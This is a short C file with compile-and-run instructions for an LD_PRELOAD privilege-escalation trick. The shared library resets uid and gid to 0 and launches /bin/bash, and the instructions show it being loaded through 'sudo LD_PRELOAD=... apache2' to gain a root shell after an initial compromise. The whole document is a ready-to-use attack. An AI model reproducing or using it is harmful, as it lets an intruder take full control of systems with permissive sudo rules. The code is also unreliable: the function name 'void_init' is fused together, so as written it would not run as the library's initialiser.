#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>

void_init(){
	
  unsetenv("LD_PRELOAD");
  setgid(0); 
  setuid(0);
  system("/bin/bash");

}

//When the above C code is infiltrated into the system, if the conditions are met, it is used to Increase Authorization in the POST EXPLOITING phase.

/*

Save the file as x.c

In command prompt type:

gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

In command prompt type:

sudo LD_PRELOAD=/tmp/x.so apache2


*/
